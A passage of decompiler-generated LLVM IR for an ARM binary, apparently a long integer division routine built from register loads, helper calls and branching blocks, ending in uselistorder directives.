  %v1_17ef8 = load i32, i32* %sb.global-to-local, align 4
  %v7_17ef8 = lshr i32 %v1_17ef8, %v1_17ef0
  %v8_17ef8 = or i32 %v7_17ef8, %v6_17ee8
  %v3_17efc = udiv i32 %v6_17eec, 65536
  store i32 %v3_17efc, i32* @r7, align 4
  store i32 %v3_17efc, i32* @r1, align 4
  store i32 %v6_17ef4, i32* @r0, align 4
  %v0_17f0c = call i32 @function_1296c()
  %v0_17f10 = load i32, i32* @r7, align 4
  store i32 %v0_17f0c, i32* %fp.global-to-local, align 4
  %v0_17f18 = load i32, i32* @r4, align 4
  %v2_17f1c = call i32 @function_12a68(i32 %v0_17f18, i32 %v0_17f10)
  %v0_17f20 = load i32, i32* @r5, align 4
  %v3_17f24 = urem i32 %v0_17f20, 65536
  store i32 %v3_17f24, i32* %r8.global-to-local, align 4
  %v2_17f28 = mul i32 %v0_17f0c, %v3_17f24
  %v3_17f30 = udiv i32 %v8_17ef8, 65536
  %v4_17f34 = mul i32 %v0_17f10, 65536
  %v5_17f34 = or i32 %v4_17f34, %v3_17f30
  %tmp156 = icmp ugt i32 %v2_17f28, %v5_17f34
  br i1 %tmp156, label %dec_label_pc_17f40, label %dec_label_pc_17f4c

dec_label_pc_17f40:                               ; preds = %dec_label_pc_17ee8
  %v2_17f40 = add i32 %v0_17f20, %v5_17f34
  %v3_17f40 = icmp ult i32 %v2_17f40, %v5_17f34
  %v1_17f44 = add i32 %v0_17f0c, -1
  store i32 %v1_17f44, i32* %fp.global-to-local, align 4
  br i1 %v3_17f40, label %dec_label_pc_17f4c, label %dec_label_pc_18200

dec_label_pc_17f4c:                               ; preds = %dec_label_pc_17ee8, %dec_label_pc_18200, %bb151, %dec_label_pc_17f40
  %v1_17f4c = phi i32 [ %v6_18208, %bb151 ], [ %v2_17f40, %dec_label_pc_17f40 ], [ %v5_17f34, %dec_label_pc_17ee8 ], [ %v2_17f40, %dec_label_pc_18200 ]
  %v2_17f4c = sub i32 %v1_17f4c, %v2_17f28
  store i32 %v2_17f4c, i32* @r4, align 4
  %v0_17f50 = load i32, i32* @r7, align 4
  store i32 %v0_17f50, i32* @r1, align 4
  store i32 %v2_17f4c, i32* @r0, align 4
  %v0_17f58 = call i32 @function_1296c()
  %v0_17f5c = load i32, i32* @r7, align 4
  store i32 %v0_17f58, i32* %r6.global-to-local, align 4
  %v0_17f64 = load i32, i32* @r4, align 4
  %v2_17f68 = call i32 @function_12a68(i32 %v0_17f64, i32 %v0_17f5c)
  %v0_17f6c = load i32, i32* %r8.global-to-local, align 4
  %v2_17f6c = mul i32 %v0_17f58, %v0_17f6c
  %v3_17f78 = urem i32 %v8_17ef8, 65536
  %v4_17f7c = mul i32 %v0_17f5c, 65536
  %v5_17f7c = or i32 %v4_17f7c, %v3_17f78
  %tmp157 = icmp ugt i32 %v2_17f6c, %v5_17f7c
  br i1 %tmp157, label %dec_label_pc_17f88, label %dec_label_pc_17f94

dec_label_pc_17f88:                               ; preds = %dec_label_pc_17f4c
  %v1_17f88 = load i32, i32* @r5, align 4
  %v2_17f88 = add i32 %v1_17f88, %v5_17f7c
  %v3_17f88 = icmp ult i32 %v2_17f88, %v5_17f7c
  %v1_17f8c = add i32 %v0_17f58, -1
  store i32 %v1_17f8c, i32* %r6.global-to-local, align 4
  br i1 %v3_17f88, label %dec_label_pc_17f94, label %dec_label_pc_181f0

dec_label_pc_17f94:                               ; preds = %dec_label_pc_17f4c, %dec_label_pc_181f0, %bb150, %dec_label_pc_17f88
  %v0_17f9c = phi i32 [ %v5_181f4, %bb150 ], [ %v1_17f8c, %dec_label_pc_17f88 ], [ %v0_17f58, %dec_label_pc_17f4c ], [ %v1_17f8c, %dec_label_pc_181f0 ]
  %v1_17f98 = phi i32 [ %v6_181f8, %bb150 ], [ %v2_17f88, %dec_label_pc_17f88 ], [ %v5_17f7c, %dec_label_pc_17f4c ], [ %v2_17f88, %dec_label_pc_181f0 ]
  %v0_17f94 = load i32, i32* %sb.global-to-local, align 4
  %v1_17f94 = load i32, i32* %sl.global-to-local, align 4
  %v6_17f94 = shl i32 %v0_17f94, %v1_17f94
  store i32 %v6_17f94, i32* %sb.global-to-local, align 4
  %v2_17f98 = sub i32 %v1_17f98, %v2_17f6c
  store i32 %v2_17f98, i32* @r4, align 4
  %v1_17f9c = load i32, i32* %fp.global-to-local, align 4
  %v4_17f9c = mul i32 %v1_17f9c, 65536
  %v5_17f9c = or i32 %v4_17f9c, %v0_17f9c
  store i32 %v5_17f9c, i32* %fp.global-to-local, align 4
  %v0_17fa0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17fa0:                               ; preds = %.thread8, %dec_label_pc_17f94
  %v0_17fa4 = phi i32 [ %v3_17ed4, %.thread8 ], [ %v2_17f98, %dec_label_pc_17f94 ]
  %v0_17fa0 = phi i32 [ %v4_17edc, %.thread8 ], [ %v0_17fa0.pre, %dec_label_pc_17f94 ]
  store i32 %v0_17fa0, i32* @r1, align 4
  store i32 %v0_17fa4, i32* @r0, align 4
  %v0_17fa8 = call i32 @function_1296c()
  %v0_17fac = load i32, i32* @r7, align 4
  store i32 %v0_17fa8, i32* %sl.global-to-local, align 4
  %v0_17fb4 = load i32, i32* @r4, align 4
  %v2_17fb8 = call i32 @function_12a68(i32 %v0_17fb4, i32 %v0_17fac)
  %v0_17fbc = load i32, i32* %r8.global-to-local, align 4
  %v2_17fbc = mul i32 %v0_17fa8, %v0_17fbc
  %v0_17fc0 = load i32, i32* %sb.global-to-local, align 4
  %v3_17fc0 = udiv i32 %v0_17fc0, 65536
  %v4_17fc4 = mul i32 %v0_17fac, 65536
  %v5_17fc4 = or i32 %v3_17fc0, %v4_17fc4
  %tmp158 = icmp ugt i32 %v2_17fbc, %v5_17fc4
  br i1 %tmp158, label %dec_label_pc_17fd0, label %.thread59

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fa0
  %v1_17fd0 = load i32, i32* @r5, align 4
  %v2_17fd0 = add i32 %v1_17fd0, %v5_17fc4
  %v3_17fd0 = icmp ult i32 %v2_17fd0, %v5_17fc4
  %v1_17fd4 = add i32 %v0_17fa8, -1
  store i32 %v1_17fd4, i32* %sl.global-to-local, align 4
  br i1 %v3_17fd0, label %.thread59, label %dec_label_pc_17fdc

dec_label_pc_17fdc:                               ; preds = %dec_label_pc_17fd0
  %tmp159 = icmp ugt i32 %v2_17fbc, %v2_17fd0
  br i1 %tmp159, label %bb120, label %.thread59

bb120:                                            ; preds = %dec_label_pc_17fdc
  %v5_17fe0 = add i32 %v0_17fa8, -2
  store i32 %v5_17fe0, i32* %sl.global-to-local, align 4
  %v6_17fe4 = add i32 %v2_17fd0, %v1_17fd0
  br label %.thread59

.thread59:                                        ; preds = %dec_label_pc_17fa0, %dec_label_pc_17fdc, %dec_label_pc_17fd0, %bb120
  %v1_17fe8 = phi i32 [ %v2_17fd0, %dec_label_pc_17fd0 ], [ %v5_17fc4, %dec_label_pc_17fa0 ], [ %v6_17fe4, %bb120 ], [ %v2_17fd0, %dec_label_pc_17fdc ]
  %v2_17fe8 = sub i32 %v1_17fe8, %v2_17fbc
  store i32 %v2_17fe8, i32* @r4, align 4
  %v0_17fec = load i32, i32* @r7, align 4
  store i32 %v0_17fec, i32* @r1, align 4
  store i32 %v2_17fe8, i32* @r0, align 4
  %v0_17ff4 = call i32 @function_1296c()
  %v0_17ff8 = load i32, i32* @r7, align 4
  store i32 %v0_17ff4, i32* %r6.global-to-local, align 4
  %v0_18000 = load i32, i32* @r4, align 4
  %v2_18004 = call i32 @function_12a68(i32 %v0_18000, i32 %v0_17ff8)
  %v0_18008 = load i32, i32* %r8.global-to-local, align 4
  %v2_18008 = mul i32 %v0_17ff4, %v0_18008
  %v0_1800c = load i32, i32* %sb.global-to-local, align 4
  %v3_18010 = urem i32 %v0_1800c, 65536
  %v4_18014 = mul i32 %v0_17ff8, 65536
  %v5_18014 = or i32 %v3_18010, %v4_18014
  %tmp160 = icmp ugt i32 %v2_18008, %v5_18014
  br i1 %tmp160, label %dec_label_pc_18020, label %bb122

dec_label_pc_18020:                               ; preds = %.thread59
  %v1_18020 = load i32, i32* @r5, align 4
  %v2_18020 = add i32 %v1_18020, %v5_18014
  %v3_18020 = icmp ult i32 %v2_18020, %v5_18014
  %v1_18024 = add i32 %v0_17ff4, -1
  store i32 %v1_18024, i32* %r6.global-to-local, align 4
  br i1 %v3_18020, label %bb122, label %dec_label_pc_1802c

dec_label_pc_1802c:                               ; preds = %dec_label_pc_18020
  %tmp161 = icmp ugt i32 %v2_18008, %v2_18020
  br i1 %tmp161, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_1802c
  %v5_18030 = add i32 %v0_17ff4, -2
  store i32 %v5_18030, i32* %r6.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %.thread59, %dec_label_pc_18020, %dec_label_pc_1802c, %bb121
  %v0_18034 = phi i32 [ %v1_18024, %dec_label_pc_18020 ], [ %v0_17ff4, %.thread59 ], [ %v1_18024, %dec_label_pc_1802c ], [ %v5_18030, %bb121 ]
  %v1_18034 = load i32, i32* %sl.global-to-local, align 4
  %v4_18034 = mul i32 %v1_18034, 65536
  %v5_18034 = or i32 %v4_18034, %v0_18034
  %v0_18038 = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17e70

dec_label_pc_18040:                               ; preds = %dec_label_pc_17e1c
  %v2_18040 = icmp ugt i32 %v0_17cf8, 254
  %v7_18040 = icmp eq i32 %v0_17cf8, 255
  %v2_18044 = xor i1 %v7_18040, true
  %v3_18044 = and i1 %v2_18040, %v2_18044
  br i1 %v3_18044, label %bb123, label %bb124

bb123:                                            ; preds = %dec_label_pc_18040
  br label %bb124

bb124:                                            ; preds = %dec_label_pc_18040, %bb123
  %v1_1804c16 = phi i32 [ %v0_17cf8, %dec_label_pc_18040 ], [ 8, %bb123 ]
  %v2_18048 = xor i1 %v2_18040, true
  %v3_18048 = or i1 %v7_18040, %v2_18048
  br i1 %v3_18048, label %bb125, label %bb126

bb125:                                            ; preds = %bb124
  br label %bb126

bb126:                                            ; preds = %bb124, %bb125
  %v1_1804c = phi i32 [ %v1_1804c16, %bb124 ], [ 0, %bb125 ]
  %v2_1804c = add i32 %v1_1804c, -1
  %v3_1804c = shl i32 1, %v2_1804c
  %v4_1804c = and i32 %v3_1804c, %v0_17cf8
  %v5_1804c = icmp ne i32 %v4_1804c, 0
  %v6_1804c = lshr i32 %v0_17cf8, %v1_1804c
  %v4_18054 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_18058 = add i32 %v4_18054, %v6_1804c
  %v3_18058 = inttoptr i32 %v2_18058 to i8*
  %v4_18058 = load i8, i8* %v3_18058, align 1
  %v6_18058 = zext i8 %v4_18058 to i32
  %v3_1805c = and i1 %v5_1804c, %v2_18044
  br i1 %v3_1805c, label %bb127, label %bb128

bb127:                                            ; preds = %bb126
  store i32 24, i32* @lr, align 4
  br label %bb128

bb128:                                            ; preds = %bb126, %bb127
  %v0_1806418 = phi i32 [ %v27_17ce4, %bb126 ], [ 24, %bb127 ]
  %v2_18060 = xor i1 %v5_1804c, true
  %v3_18060 = or i1 %v7_18040, %v2_18060
  br i1 %v3_18060, label %bb129, label %bb130

bb129:                                            ; preds = %bb128
  store i32 32, i32* @lr, align 4
  br label %bb130

bb130:                                            ; preds = %bb128, %bb129
  %v0_18064 = phi i32 [ %v0_1806418, %bb128 ], [ 32, %bb129 ]
  %v2_18064 = sub i32 %v0_18064, %v6_18058
  store i32 %v2_18064, i32* %fp.global-to-local, align 4
  %v9_18064 = icmp eq i32 %v0_18064, %v6_18058
  br i1 %v9_18064, label %dec_label_pc_17e54, label %dec_label_pc_1806c

dec_label_pc_1806c:                               ; preds = %bb106, %bb130
  %v1_18078 = phi i32 [ %v2_17e4c, %bb106 ], [ %v2_18064, %bb130 ]
  %v6_1806c = shl i32 %v0_17cf8, %v1_18078
  %v1_18070 = sub i32 32, %v1_18078
  %v7_18074 = lshr i32 %v0_17d08, %v1_18070
  %v8_18074 = or i32 %v7_18074, %v6_1806c
  store i32 %v8_18074, i32* %r8.global-to-local, align 4
  %v6_18078 = shl i32 %v0_17d00, %v1_18078
  %v6_1807c = lshr i32 %v0_17d00, %v1_18070
  store i32 %v6_1807c, i32* @r4, align 4
  %v7_18080 = lshr i32 %v0_17d0c, %v1_18070
  %v8_18080 = or i32 %v7_18080, %v6_18078
  %v3_18084 = udiv i32 %v8_18074, 65536
  store i32 %v3_18084, i32* %sl.global-to-local, align 4
  store i32 %v3_18084, i32* @r1, align 4
  store i32 %v6_1807c, i32* @r0, align 4
  %v0_18094 = call i32 @function_1296c()
  %v0_180a0 = load i32, i32* @r4, align 4
  %v2_180a4 = call i32 @function_12a68(i32 %v0_180a0, i32 %v3_18084)
  %v0_180a8 = load i32, i32* %r8.global-to-local, align 4
  %v3_180b0 = urem i32 %v0_180a8, 65536
  store i32 %v3_180b0, i32* @r7, align 4
  %v2_180b4 = mul i32 %v3_180b0, %v0_18094
  %v3_180bc = udiv i32 %v8_18080, 65536
  %v4_180c0 = mul nuw i32 %v3_18084, 65536
  %v5_180c0 = or i32 %v4_180c0, %v3_180bc
  %v9_180c4 = icmp eq i32 %v2_180b4, %v5_180c0
  %v0_180c8 = load i32, i32* @r5, align 4
  %v1_180c8 = load i32, i32* %fp.global-to-local, align 4
  %v2_180c8 = add i32 %v1_180c8, -1
  %v3_180c8 = lshr i32 -2147483648, %v2_180c8
  %v4_180c8 = and i32 %v3_180c8, %v0_180c8
  %v6_180c8 = shl i32 %v0_180c8, %v1_180c8
  store i32 %v6_180c8, i32* @r5, align 4
  %v2_180cc = icmp eq i32 %v4_180c8, 0
  %v3_180cc = or i1 %v9_180c4, %v2_180cc
  br i1 %v3_180cc, label %dec_label_pc_180e4, label %dec_label_pc_180d0

dec_label_pc_180d0:                               ; preds = %dec_label_pc_1806c
  %v2_180d4 = add i32 %v0_180a8, %v5_180c0
  %v3_180d4 = icmp ult i32 %v2_180d4, %v5_180c0
  %v1_180d8 = add i32 %v0_18094, -1
  br i1 %v3_180d4, label %dec_label_pc_180e4, label %dec_label_pc_181dc

dec_label_pc_180e4:                               ; preds = %.thread67, %dec_label_pc_180d0, %dec_label_pc_1806c
  %v1_180e4 = phi i32 [ %v5_180c0, %dec_label_pc_1806c ], [ %v2_180d4, %dec_label_pc_180d0 ], [ %v1_180e422, %.thread67 ]
  %stack_var_-52.0 = phi i32 [ %v0_18094, %dec_label_pc_1806c ], [ %v1_180d8, %dec_label_pc_180d0 ], [ %v4_181e8.v1_180d8, %.thread67 ]
  %v2_180e4 = sub i32 %v1_180e4, %v2_180b4
  store i32 %v2_180e4, i32* @r4, align 4
  %v0_180e8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_180e8, i32* @r1, align 4
  store i32 %v2_180e4, i32* @r0, align 4
  %v0_180f0 = call i32 @function_1296c()
  store i32 %v0_180f0, i32* %r6.global-to-local, align 4
  %v0_180fc = load i32, i32* @r4, align 4
  %v2_18100 = call i32 @function_12a68(i32 %v0_180fc, i32 %v0_180e8)
  %v0_18104 = load i32, i32* @r7, align 4
  %v2_18104 = mul i32 %v0_180f0, %v0_18104
  %v3_18110 = urem i32 %v8_18080, 65536
  %v4_18114 = mul i32 %v0_180e8, 65536
  %v5_18114 = or i32 %v4_18114, %v3_18110
  %tmp162 = icmp ugt i32 %v2_18104, %v5_18114
  br i1 %tmp162, label %dec_label_pc_18120, label %dec_label_pc_1812c

dec_label_pc_18120:                               ; preds = %dec_label_pc_180e4
  %v1_18120 = load i32, i32* %r8.global-to-local, align 4
  %v2_18120 = add i32 %v1_18120, %v5_18114
  %v3_18120 = icmp ult i32 %v2_18120, %v5_18114
  %v1_18124 = add i32 %v0_180f0, -1
  store i32 %v1_18124, i32* %r6.global-to-local, align 4
  br i1 %v3_18120, label %dec_label_pc_1812c, label %dec_label_pc_181cc

dec_label_pc_1812c:                               ; preds = %dec_label_pc_180e4, %dec_label_pc_181cc, %bb148, %dec_label_pc_18120
  %v0_18134 = phi i32 [ %v5_181d4, %bb148 ], [ %v1_18124, %dec_label_pc_18120 ], [ %v0_180f0, %dec_label_pc_180e4 ], [ %v1_18124, %dec_label_pc_181cc ]
  %v1_18130 = phi i32 [ %v6_181d0, %bb148 ], [ %v2_18120, %dec_label_pc_18120 ], [ %v5_18114, %dec_label_pc_180e4 ], [ %v2_18120, %dec_label_pc_181cc ]
  store i32 %stack_var_-52.0, i32* %r8.global-to-local, align 4
  %v2_18130 = sub i32 %v1_18130, %v2_18104
  %v4_18134 = mul i32 %stack_var_-52.0, 65536
  %v5_18134 = or i32 %v0_18134, %v4_18134
  %v3_18138 = udiv i32 %v5_18134, 65536
  %v0_1813c = load i32, i32* @r5, align 4
  %v3_1813c = udiv i32 %v0_1813c, 65536
  %tmp163 = mul i32 %v3_18138, -65536
  %v5_18140 = add i32 %tmp163, -1
  %v6_18140 = and i32 %v5_18134, %v5_18140
  %tmp164 = mul i32 %v3_1813c, -65536
  %v5_18144 = add i32 %tmp164, -1
  %v6_18144 = and i32 %v0_1813c, %v5_18144
  %v2_18148 = mul i32 %v6_18144, %v6_18140
  %v2_1814c = mul i32 %v6_18144, %v3_18138
  %v2_18150 = mul i32 %v3_1813c, %v6_18140
  %v2_18154 = mul nuw i32 %v3_1813c, %v3_18138
  %v2_18158 = add i32 %v2_1814c, %v2_18150
  %v3_18158 = icmp ult i32 %v2_18158, %v2_1814c
  br i1 %v3_18158, label %bb132, label %bb133

bb132:                                            ; preds = %dec_label_pc_1812c
  %v2_1815c = add i32 %v2_18154, 65536
  br label %bb133

bb133:                                            ; preds = %dec_label_pc_1812c, %bb132
  %v0_18164 = phi i32 [ %v2_18154, %dec_label_pc_1812c ], [ %v2_1815c, %bb132 ]
  %v4_18160 = mul i32 %v2_18158, 65536
  %v5_18160 = add i32 %v4_18160, %v2_18148
  %v2_18164 = and i32 %v2_18158, 32768
  %v3_18164 = icmp ne i32 %v2_18164, 0
  %v4_18164 = udiv i32 %v2_18158, 65536
  %v7_18164 = zext i1 %v3_18164 to i32
  %v6_18164 = add nuw nsw i32 %v7_18164, %v4_18164
  %v8_18164 = add i32 %v6_18164, %v0_18164
  %v3_18168 = icmp ult i32 %v2_18130, %v8_18164
  br i1 %v3_18168, label %dec_label_pc_18190, label %dec_label_pc_18170

dec_label_pc_18170:                               ; preds = %bb133
  %v9_18168 = icmp eq i32 %v2_18130, %v8_18164
  %. = zext i1 %v9_18168 to i32
  %v1_18178 = load i32, i32* %sb.global-to-local, align 4
  %v2_18178 = load i32, i32* %fp.global-to-local, align 4
  %v7_18178 = shl i32 %v1_18178, %v2_18178
  %v9_18178 = icmp uge i32 %v5_18160, %v7_18178
  %v15_18178 = icmp eq i32 %v5_18160, %v7_18178
  %v2_1817c = xor i1 %v9_18178, true
  %v3_1817c = or i1 %v15_18178, %v2_1817c
  br i1 %v3_1817c, label %bb136, label %bb137

bb136:                                            ; preds = %dec_label_pc_18170
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18170, %bb136
  %v4_18180 = phi i32 [ %., %dec_label_pc_18170 ], [ 0, %bb136 ]
  %v2_18180 = xor i1 %v15_18178, true
  %v3_18180 = and i1 %v9_18178, %v2_18180
  br i1 %v3_18180, label %bb138, label %thread-pre-split

bb138:                                            ; preds = %bb137
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb137, %bb138
  %v2_18184 = icmp eq i32 %v4_18180, 0
  br i1 %v2_18184, label %bb139, label %dec_label_pc_18190

bb139:                                            ; preds = %thread-pre-split
  br label %dec_label_pc_17e70

dec_label_pc_18190:                               ; preds = %bb133, %thread-pre-split
  %v1_18190 = add i32 %v5_18134, -1
  br label %dec_label_pc_17e70

dec_label_pc_1819c:                               ; preds = %dec_label_pc_17e9c
  %v2_1819c = icmp ugt i32 %v0_17eec, 254
  %v7_1819c = icmp eq i32 %v0_17eec, 255
  %v2_181a0 = xor i1 %v7_1819c, true
  %v3_181a0 = and i1 %v2_1819c, %v2_181a0
  br i1 %v3_181a0, label %bb140, label %bb141

bb140:                                            ; preds = %dec_label_pc_1819c
  store i32 24, i32* @ip, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_1819c, %bb140
  %v2_181a4 = xor i1 %v2_1819c, true
  %v3_181a4 = or i1 %v7_1819c, %v2_181a4
  br i1 %v3_181a4, label %bb142, label %.thread61

bb142:                                            ; preds = %bb141
  store i32 32, i32* @ip, align 4
  store i32 0, i32* @r3, align 4
  br label %.thread61

.thread61:                                        ; preds = %bb141, %bb142
  br i1 %v3_181a0, label %bb143, label %._crit_edge

._crit_edge:                                      ; preds = %.thread61
  %v1_17ebc.pre = load i32, i32* @r3, align 4
  br label %bb118

bb143:                                            ; preds = %.thread61
  br label %bb118

dec_label_pc_181b4:                               ; preds = %dec_label_pc_17d1c
  %v2_181b4 = icmp ugt i32 %v0_17d08, 254
  %v7_181b4 = icmp eq i32 %v0_17d08, 255
  %v2_181b8 = xor i1 %v7_181b4, true
  %v3_181b8 = and i1 %v2_181b4, %v2_181b8
  br i1 %v3_181b8, label %bb144, label %bb145

bb144:                                            ; preds = %dec_label_pc_181b4
  store i32 24, i32* @ip, align 4
  br label %bb145

bb145:                                            ; preds = %dec_label_pc_181b4, %bb144
  %v2_181bc = xor i1 %v2_181b4, true
  %v3_181bc = or i1 %v7_181b4, %v2_181bc
  br i1 %v3_181bc, label %bb146, label %.thread62

bb146:                                            ; preds = %bb145
  store i32 32, i32* @ip, align 4
  br label %.thread62

.thread62:                                        ; preds = %bb145, %bb146
  br i1 %v3_181b8, label %bb147, label %bb92

bb147:                                            ; preds = %.thread62
  br label %bb92

dec_label_pc_181cc:                               ; preds = %dec_label_pc_18120
  %tmp165 = icmp ugt i32 %v2_18104, %v2_18120
  br i1 %tmp165, label %bb148, label %dec_label_pc_1812c

bb148:                                            ; preds = %dec_label_pc_181cc
  %v6_181d0 = add i32 %v2_18120, %v1_18120
  %v5_181d4 = add i32 %v0_180f0, -2
  store i32 %v5_181d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1812c

dec_label_pc_181dc:                               ; preds = %dec_label_pc_180d0
  %tmp166 = icmp ugt i32 %v2_180b4, %v2_180d4
  br i1 %tmp166, label %bb149, label %.thread67

bb149:                                            ; preds = %dec_label_pc_181dc
  %v5_181e0 = add i32 %v0_18094, -2
  %v6_181e4 = add i32 %v2_180d4, %v0_180a8
  br label %.thread67

.thread67:                                        ; preds = %dec_label_pc_181dc, %bb149
  %v4_181e865 = phi i32 [ %v5_181e0, %bb149 ], [ %v1_180d8, %dec_label_pc_181dc ]
  %v1_180e422 = phi i32 [ %v6_181e4, %bb149 ], [ %v2_180d4, %dec_label_pc_181dc ]
  %v4_181e8.v1_180d8 = select i1 %tmp166, i32 %v4_181e865, i32 %v1_180d8
  br label %dec_label_pc_180e4

dec_label_pc_181f0:                               ; preds = %dec_label_pc_17f88
  %tmp167 = icmp ugt i32 %v2_17f6c, %v2_17f88
  br i1 %tmp167, label %bb150, label %dec_label_pc_17f94

bb150:                                            ; preds = %dec_label_pc_181f0
  %v5_181f4 = add i32 %v0_17f58, -2
  store i32 %v5_181f4, i32* %r6.global-to-local, align 4
  %v6_181f8 = add i32 %v2_17f88, %v1_17f88
  br label %dec_label_pc_17f94

dec_label_pc_18200:                               ; preds = %dec_label_pc_17f40
  %tmp168 = icmp ugt i32 %v2_17f28, %v2_17f40
  br i1 %tmp168, label %bb151, label %dec_label_pc_17f4c

bb151:                                            ; preds = %dec_label_pc_18200
  %v5_18204 = add i32 %v0_17f0c, -2
  store i32 %v5_18204, i32* %fp.global-to-local, align 4
  %v6_18208 = add i32 %v2_17f40, %v0_17f20
  br label %dec_label_pc_17f4c

; uselistorder directives
  uselistorder i32 %v5_181f4, { 1, 0 }
  uselistorder i1 %tmp166, { 1, 0 }
  uselistorder i32 %v5_181d4, { 1, 0 }
  uselistorder i1 %v7_181b4, { 1, 0 }
  uselistorder i1 %v7_1819c, { 1, 0 }
  uselistorder i1 %v9_18178, { 1, 0 }
  uselistorder i32 %v7_18178, { 1, 0 }
  uselistorder i32 %v2_18158, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1814c, { 1, 0 }
  uselistorder i32 %v3_1813c, { 2, 1, 0 }
  uselistorder i32 %v0_1813c, { 1, 0 }
  uselistorder i32 %v3_18138, { 2, 1, 0 }
  uselistorder i32 %v5_18134, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18120, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_18114, { 2, 3, 1, 0 }
  uselistorder i32 %v2_18104, { 0, 2, 1 }
  uselistorder i32 %v0_180f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_180e8, { 1, 0, 2 }
  uselistorder i32 %v1_180d8, { 1, 0, 2 }
  uselistorder i32 %v2_180d4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_180c8, { 1, 0 }
  uselistorder i32 %v0_180c8, { 1, 0 }
  uselistorder i32 %v5_180c0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_180b0, { 1, 0 }
  uselistorder i32 %v0_180a8, { 1, 2, 0 }
  uselistorder i32 %v0_18094, { 1, 3, 2, 0 }
  uselistorder i32 %v3_18084, { 1, 0, 3, 2 }
  uselistorder i32 %v2_18064, { 1, 2, 0 }
  uselistorder i32 %v0_18064, { 1, 0 }
  uselistorder i32 %v6_18058, { 1, 0 }
  uselistorder i1 %v2_18044, { 1, 0 }
  uselistorder i1 %v7_18040, { 1, 2, 0 }
  uselistorder i32 %v5_18014, { 2, 1, 0 }
  uselistorder i32 %v0_17ff4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17fd0, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17fc4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17fbc, { 2, 0, 1 }
  uselistorder i32 %v0_17fa8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17f88, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17f7c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17f6c, { 0, 2, 1 }
  uselistorder i32 %v0_17f58, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_17f40, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17f34, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17f28, { 0, 2, 1 }
  uselistorder i32 %v3_17f24, { 1, 0 }
  uselistorder i32 %v0_17f20, { 1, 2, 0 }
  uselistorder i32 %v0_17f0c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17efc, { 1, 0 }
  uselistorder i32 %v4_17edc, { 1, 0 }
  uselistorder i32 %v2_17ed4, { 1, 0, 2 }
  uselistorder i32 %v6_17ec8, { 1, 0 }
  uselistorder i1 %v9_17ea8, { 1, 0 }
  uselistorder i32 %v0_17eec, { 9, 8, 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i1 %v3_17e54, { 1, 0 }
  uselistorder i32 %v2_17e4c, { 1, 0, 2 }
  uselistorder i32 %v0_17e4c, { 1, 0 }
  uselistorder i32 %v6_17e40, { 1, 0 }
  uselistorder i1 %v2_17e2c, { 1, 0 }
  uselistorder i1 %v9_17e28, { 1, 2, 0 }
  uselistorder i1 %v9_17e10, { 1, 0 }
  uselistorder i32 %v5_17de4, { 2, 1, 0 }
  uselistorder i32 %v0_17dc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17dbc, { 1, 0, 2 }
  uselistorder i32 %v2_17da0, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17d94, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17d8c, { 2, 0, 1 }
  uselistorder i32 %v3_17d88, { 1, 0 }
  uselistorder i32 %v0_17d84, { 1, 2, 0 }
  uselistorder i32 %v0_17d70, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17d60.c, { 1, 0 }
  uselistorder i32 %v3_17d60, { 1, 0 }
  uselistorder i32 %v6_17d48, { 1, 0 }
  uselistorder i1 %v9_17d28, { 1, 0 }
  uselistorder i32 %v0_17d0c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_17d08, { 9, 8, 12, 2, 10, 11, 1, 3, 4, 5, 6, 7, 0, 13 }
  uselistorder i32 %v0_17d00, { 5, 6, 4, 1, 7, 2, 3, 0, 8 }
  uselistorder i32 %v0_17cf8, { 4, 6, 1, 5, 12, 11, 3, 7, 2, 8, 9, 10, 0, 13, 14 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 10, 8, 9, 11 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 0, 5, 6, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 8, 11, 12, 13, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 14, 12, 15 }
  uselistorder i32* %fp.global-to-local, { 0, 8, 9, 1, 6, 2, 4, 3, 5, 7, 10 }
  uselistorder i32 32768, { 3, 4, 2, 6, 5, 1, 0 }
  uselistorder i32 -65536, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 255, { 25, 26, 27, 22, 23, 24, 17, 2, 0, 18, 19, 28, 20, 5, 29, 6, 30, 3, 4, 1, 7, 10, 31, 11, 32, 8, 33, 9, 34, 12, 35, 13, 36, 14, 37, 15, 38, 21, 16, 39 }
